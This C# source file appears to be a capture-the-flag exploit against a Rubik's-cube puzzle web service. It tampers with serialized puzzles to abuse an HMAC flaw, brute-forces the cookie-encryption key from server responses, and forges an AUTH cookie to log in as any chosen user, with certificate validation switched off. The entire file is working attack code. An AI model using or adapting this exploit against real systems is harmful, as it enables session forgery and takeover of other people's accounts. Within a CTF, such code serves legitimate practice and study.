using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;
using System.Threading.Tasks;

namespace rubikxplt
{
	static class Program
	{
		private static readonly Version HttpVersion = new Version(2, 0);

		private static readonly Uri BaseUri = new Uri("https://localhost:5001/");

		private static readonly Uri ApiGenerate = new Uri(BaseUri, "/api/generate");
		private static readonly Uri ApiSolve = new Uri(BaseUri, "/api/solve");
		private static readonly Uri ApiAuth = new Uri(BaseUri, "/api/auth");

		private const string Login = "h@ck";
		private const string Pass = "h@ck";

		private static readonly string SafePrefix = "DDDDDDDDUUUUDDDDDdUUUUUUUUUUUUUUUU";

		private static int SolutionLength;
		private static string LoginToHack;

		static async Task Main(string[] args)
		{
			if(args.Length < 2)
			{
				Console.WriteLine("xplt SolutionLength LoginToHack");
				return;
			}

			SolutionLength = int.Parse(args[0]);
			LoginToHack = args[1];

			const int Up = 2; // Rotation UP
			const int Down = 5; // Rotation DOWN
			const int UNK = 0; // Unknown key byte to brute force

			var puzzle = await GetHackedPuzzle();

			byte[] KEY = new byte[16];

			var key = new byte[] {Down, Down, UNK, 2, Down, Down, UNK, Up, Up, Up, Up, UNK, Down, Down, Down, Down};
			await BruteForceSolution(key, Login, Pass, puzzle, "UUddl", 0x2, 0x6, 0xB);
			KEY[0x2] = key[0x2];
			KEY[0x6] = key[0x6];
			KEY[0xB] = key[0xB];
			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");

			//puzzle = await GetHackedPuzzle();

			key = new byte[] {Up, UNK, KEY[0x2], Down, Down, Down, KEY[0x6], Up, Up, Up, UNK, KEY[0xB], Down, Down, Down, Down};
			await BruteForceSolution(key, Login, Pass, puzzle, "UUdd", 0x1, 0xA);
			KEY[0x1] = key[0x1];
			KEY[0xA] = key[0xA];
			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");

			//puzzle = await GetHackedPuzzle();

			key = new byte[] {Up, Up, KEY[0x2], Down, Down, Down, KEY[0x6], Up, Up, UNK, UNK, KEY[0xB], UNK, Down, Down, Down};
			await BruteForceSolution(key, Login, Pass, puzzle, "UUddL", 0x9, 0xA, 0xC);
			KEY[0xE] = key[0x9];
			KEY[0xF] = key[0xA];
			KEY[0x7] = key[0xC];
			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");

			//puzzle = await GetHackedPuzzle();

			key = new byte[] {UNK, Up, KEY[0x2], Down, Down, Down, KEY[0x6], Up, UNK, UNK, KEY[0xF], KEY[0xB], KEY[0x7], Down, Down, Down};
			await BruteForceSolution(key, Login, Pass, puzzle, "UUddLDD", 0x0, 0x8, 0x9);
			KEY[0x0] = key[0x0];
			KEY[0x8] = key[0x8];
			KEY[0x9] = key[0x9];
			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");

			//puzzle = await GetHackedPuzzle();

			key = new byte[] {KEY[0x0], Up, KEY[0x2], Up, KEY[0x1], Down, KEY[0x6], Up, KEY[0x8], KEY[0x9], KEY[0xF], KEY[0xB], Down, Down, UNK, UNK};
			await BruteForceSolution(key, Login, Pass, puzzle, "UUddLDDu", 0xE, 0xF);
			KEY[0xC] = key[0xE];
			KEY[0xD] = key[0xF];
			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");

			//puzzle = await GetHackedPuzzle();

			key = new byte[] {KEY[0x0], KEY[0x1], KEY[0x2], UNK, UNK, UNK, KEY[0x6], KEY[0x7], KEY[0x8], KEY[0x9], KEY[0xA], KEY[0xB], KEY[0xC], KEY[0xD], KEY[0xE], KEY[0xF]};
			await BruteForceSolution(key, Login, Pass, puzzle, "", 0x3, 0x4, 0x5);
			KEY[0x3] = key[0x3];
			KEY[0x4] = key[0x4];
			KEY[0x5] = key[0x5];
			Console.WriteLine($"KEY: {BitConverter.ToString(KEY)}");

			Console.WriteLine($"Done! The key is '{new Guid(key)}', use it to encrypt forged cookie!");
			var cookie = ForgeCookie(LoginToHack, KEY);

			Console.WriteLine($"Forged cookie for '{LoginToHack}': '{cookie}'");
			var auth = await Auth(cookie);
			Console.WriteLine($"Auth: {auth}");
		}

		private static async Task<string> Auth(string cookie)
		{
			var cookies = new CookieContainer();
			cookies.Add(BaseUri, new Cookie("AUTH", cookie));
			using var client = new HttpClient(new HttpClientHandler {ServerCertificateCustomValidationCallback = CertificateValidationCallback, CookieContainer = cookies}) {DefaultRequestVersion = HttpVersion};
			return await client.GetStringAsync(ApiAuth);
		}

		private static string ForgeCookie(string login, byte[] key)
		{
			Span<char> cookie = stackalloc char[100];
			TokenCrypt.Encrypt(key, Encoding.UTF8.GetBytes(login), ref cookie);
			return cookie.ToString();
		}

		static async Task BruteForceSolution(byte[] key, string login, string pass, string puzzle, string suffix, params int[] idx)
		{
			var solution = SafePrefix + new string('L', (SolutionLength - SafePrefix.Length - suffix.Length) / 4 * 4) + suffix;
			var cookie = await Solve(login, pass, puzzle, solution);
			if(!BruteForceKeyBytes(Encoding.UTF8.GetBytes(login), Convert.FromBase64String(cookie), key, idx))
				throw new Exception("Brute force failed :(");
		}

		private static async Task<string> Solve(string login, string pass, string puzzle, string solution)
		{
			var cookies = new CookieContainer();
			using var client = new HttpClient(new HttpClientHandler {ServerCertificateCustomValidationCallback = CertificateValidationCallback, CookieContainer = cookies}) {DefaultRequestVersion = HttpVersion};
			using var result = await client.PostAsync(ApiSolve + $"?login={WebUtility.UrlEncode(login)}&pass={WebUtility.UrlEncode(pass)}&puzzle={WebUtility.UrlEncode(puzzle)}&solution={WebUtility.UrlEncode(solution)}", null);
			if(result.StatusCode != HttpStatusCode.OK && result.StatusCode != (HttpStatusCode)418)
				throw new Exception($"/api/solve failed with HTTP {(int)result.StatusCode} -> {await result.Content.ReadAsStringAsync()}");
			return WebUtility.UrlDecode(cookies.GetCookies(BaseUri)["AUTH"]?.Value);
		}

		static bool BruteForceKeyBytes(byte[] plain, byte[] cipher, byte[] key, params int[] idx)
		{
			if(idx.Length > 3)
				throw new Exception("Can't brute force more than 3 bytes");
			Console.WriteLine($"Brute force {idx.Length} key bytes: {string.Join(", ", idx)}");
			if(idx.Length == 1)
				return BruteForceOneKeyByte(plain, cipher, key, idx[0]);
			if(idx.Length == 2)
				return BruteForceTwoKeyBytes(plain, cipher, key, idx[0], idx[1]);
			if(idx.Length == 3)
				return BruteForceThreeKeyBytes(plain, cipher, key, idx[0], idx[1], idx[2]);
			return true;
		}

		static bool BruteForceThreeKeyBytes(byte[] plain, byte[] cipher, byte[] key, int idx1, int idx2, int idx3)
		{
			for(int i = 0; i < 255; i++)
			{
				key[idx1] = (byte)i;
				var sw = Stopwatch.StartNew();
				if(BruteForceTwoKeyBytes(plain, cipher, key, idx2, idx3))
					return true;
				Console.WriteLine($"First byte checked: 0x{i:X2}, elapsed {sw.Elapsed}");
			}
			return false;
		}

		static bool BruteForceTwoKeyBytes(byte[] plain, byte[] cipher, byte[] key, int idx1, int idx2)
		{
			for(int j = 0; j < 255; j++)
			{
				key[idx1] = (byte)j;
				if(BruteForceOneKeyByte(plain, cipher, key, idx2))
					return true;
			}
			return false;
		}

		static bool BruteForceOneKeyByte(byte[] plain, byte[] cipher, byte[] key, int idx1)
		{
			Span<byte> buffer = stackalloc byte[plain.Length];
			for(int k = 0; k < 255; k++)
			{
				key[idx1] = (byte)k;
				if(CheckKey(plain, cipher, buffer, key))
					return true;
			}
			return false;
		}

		static bool CheckKey(byte[] plain, byte[] cipher, Span<byte> buffer, byte[] key)
		{
			try
			{
				TokenCrypt.Decrypt(key, cipher, ref buffer);
				return plain.AsSpan().SequenceEqual(buffer);
			}
			catch
			{
				return false;
			}
		}

		private const int GeneratedCubeLength = HmacOffset + HmacLength;
		private const int HmacOffset = 2 + 8 + 16 + 54;
		private const int HmacLength = 20;

		static async Task<string> GetHackedPuzzle()
		{
			using var client = new HttpClient(new HttpClientHandler {ServerCertificateCustomValidationCallback = CertificateValidationCallback}) {DefaultRequestVersion = HttpVersion};
			for(int i = 0; i < 5000; i++)
			{
				var value = await client.GenerateCube();
				var puzzle = Convert.FromBase64String(value);
				if(puzzle.Length != GeneratedCubeLength)
					throw new Exception("Invalid serialized puzzle length");
				if(puzzle[HmacOffset] == puzzle[HmacOffset - 1])
				{
					Console.WriteLine("Exploitable serialized puzzle found");
					Console.WriteLine("Initial: " + BitConverter.ToString(puzzle));
					Array.Copy(puzzle, HmacOffset, puzzle, HmacOffset - 1, HmacLength);
					var hacked = Convert.ToBase64String(puzzle, 0, GeneratedCubeLength - 1);
					Console.WriteLine($"Hacked: {BitConverter.ToString(puzzle, 0, GeneratedCubeLength - 1)}");
					return hacked;
				}
			}
			throw new Exception("Attempts limit exceeded");
		}

		static async Task<string> GenerateCube(this HttpClient client)
			=> JsonSerializer.Deserialize<Generated>(await client.GetStringAsync(ApiGenerate)).Value;

		private static bool CertificateValidationCallback(HttpRequestMessage _, X509Certificate2 __, X509Chain ___, SslPolicyErrors ____) => true;
	}

	public class Generated
	{
		[JsonPropertyName("rubik")]
		public string Rubik { get; set; }

		[JsonPropertyName("value")]
		public string Value { get; set; }
	}
}
